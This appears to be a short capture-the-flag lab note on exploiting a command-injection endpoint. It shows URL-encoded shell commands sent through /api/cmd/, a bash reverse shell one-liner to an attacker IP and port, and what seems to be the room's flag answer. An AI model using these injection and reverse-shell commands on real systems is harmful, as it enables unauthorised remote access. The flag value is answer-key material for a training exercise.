# Commands

```
command injection

```

## Notes

```
export IP=10.10.235.33
```

## Questions

1. What are the contents of user.txt file?

```
/api/cmd/find%20%2F%20-name%20user.txt%202%3E%2Fdev%2Fnull => to find the file
/api/cmd/cd%20%2Fhome%2Fbestadmin%2Fuser.txt => to access user.txt (FAILED)

bash -i >& /dev/tcp/10.9.18.129/9000 0>&1 => Reverse shell

5W7WkjxBWwhe3RNsWJ3Q
```
